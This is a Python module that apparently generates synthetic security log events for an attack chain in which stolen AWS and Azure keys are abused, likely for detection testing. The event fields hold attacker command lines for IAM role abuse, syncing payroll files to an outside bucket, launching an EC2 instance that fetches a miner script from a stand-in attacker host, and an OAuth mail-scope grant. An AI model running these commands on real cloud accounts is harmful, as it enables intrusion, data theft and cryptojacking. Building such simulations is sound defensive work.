import random
from typing import Any, Dict, List

from ..builder import build_base_event
from .common import _append_and_maybe_stop, _rand_hash, _shared_context


def cloud_key_abuse_chain(ctx: Dict[str, Any], attack_id: str, start_ts: int) -> List[Dict[str, Any]]:
    """Stolen AWS/Azure keys abused for discovery, privilege abuse, and crypto mining."""
    shared = _shared_context(ctx)
    events: List[Dict[str, Any]] = []

    evt1 = build_base_event(
        start_ts,
        ctx,
        overrides={
            **shared,
            "category": "cloud_iam_anomaly",
            "severity": "2",
            "attack": {"id": attack_id, "stage": "credential_access", "sequence": 1},
            "action": "allowed",
            "direction": "outbound",
        },
    )
    evt1["cloud"] = {"provider": "aws", "account": {"id": f"12{random.randint(10,99)}-stolen"}, "region": "us-east-1"}
    evt1["source"]["as"] = {"number": random.randint(10000, 65000), "organization": {"name": "new-asn"}}
    evt1["process"] = {"name": "aws", "command_line": "aws sts get-caller-identity"}
    evt1["authentication"] = {"method": "access_key", "new_device": True, "mfa": "not_challenged"}
    evt1["network"]["direction"] = "outbound"
    if _append_and_maybe_stop(events, evt1):
        return events

    evt2 = build_base_event(
        start_ts + random.randint(120, 420),
        ctx,
        overrides={
            **shared,
            "category": "cloud_discovery",
            "severity": "2",
            "attack": {"id": attack_id, "stage": "discovery", "sequence": 2},
            "action": "logged",
        },
    )
    evt2["process"] = {"name": "aws", "command_line": "aws s3 ls"}
    evt2["cloud"] = {"provider": "aws", "service": {"name": "s3"}, "region": random.choice(["us-east-1", "eu-west-1"])}
    evt2["url"] = {"full": "https://s3.amazonaws.com"}
    evt2["network"]["direction"] = "outbound"
    if _append_and_maybe_stop(events, evt2):
        return events

    evt3 = build_base_event(
        start_ts + random.randint(600, 1200),
        ctx,
        overrides={
            **shared,
            "category": "cloud_privilege_escalation",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "privilege_escalation", "sequence": 3},
            "action": random.choice(["logged", "blocked"]),
        },
    )
    evt3["process"] = {"name": "aws", "command_line": "aws iam pass-role --role-name FusionAI-Prod-Role --role-session-name attacker"}
    evt3["cloud"] = {"provider": "aws", "service": {"name": "iam"}, "region": "us-east-1"}
    evt3["http"] = {"method": "POST", "response": {"status_code": random.choice([200, 403])}}
    evt3["network"]["direction"] = "outbound"
    if _append_and_maybe_stop(events, evt3):
        return events

    evt4 = build_base_event(
        start_ts + random.randint(1500, 2400),
        ctx,
        overrides={
            **shared,
            "category": "cloud_data_exfil",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "exfiltration", "sequence": 4},
            "action": random.choice(["blocked", "allowed"]),
        },
    )
    bucket = f"s3://finance-export-{random.randint(100, 999)}"
    evt4["process"] = {"name": "aws", "command_line": f"aws s3 sync /tmp/exports {bucket} --quiet"}
    evt4["file"] = {
        "path": "/tmp/exports/payroll.xlsx",
        "extension": "xlsx",
        "size": random.randint(600000, 2400000),
        "hash": {"sha256": _rand_hash()},
    }
    evt4["url"] = {"full": f"https://{bucket.replace('s3://', '')}.s3.amazonaws.com"}
    evt4["network"]["direction"] = "outbound"
    if _append_and_maybe_stop(events, evt4):
        return events

    evt5 = build_base_event(
        start_ts + random.randint(2500, 4200),
        ctx,
        overrides={
            **shared,
            "category": "cloud_resource_hijack",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "impact", "sequence": 5},
            "action": "logged",
        },
    )
    evt5["process"] = {
        "name": "aws",
        "command_line": "aws ec2 run-instances --image-id ami-0abcdef --instance-type c5.9xlarge --user-data https://cdn.attacker[.]net/miner.sh",
    }
    evt5["cloud"] = {"provider": "aws", "service": {"name": "ec2"}, "region": random.choice(["us-west-2", "ap-south-1"])}
    evt5["network"]["direction"] = "outbound"
    evt5["http"] = {"request": {"referrer": "https://cdn.awsstatic.com"}, "response": {"status_code": 200}}
    _append_and_maybe_stop(events, evt5)

    evt6 = build_base_event(
        start_ts + random.randint(3200, 5200),
        ctx,
        overrides={
            **shared,
            "category": "oauth_consent_abuse",
            "severity": "2",
            "attack": {"id": attack_id, "stage": "persistence", "sequence": 6},
            "action": random.choice(["allowed", "blocked"]),
        },
    )
    evt6["process"] = {
        "name": "azure",
        "command_line": "az ad app permission grant --id 2c2a-app --api 00000003-0000-0000-c000-000000000000 --scope Mail.ReadWrite",
    }
    evt6["cloud"] = {"provider": "azure", "service": {"name": "aad"}, "region": "global"}
    evt6["authentication"] = {"mfa": "bypassed", "device": "new_oauth_client"}
    evt6["network"]["direction"] = "outbound"
    _append_and_maybe_stop(events, evt6)

    return events
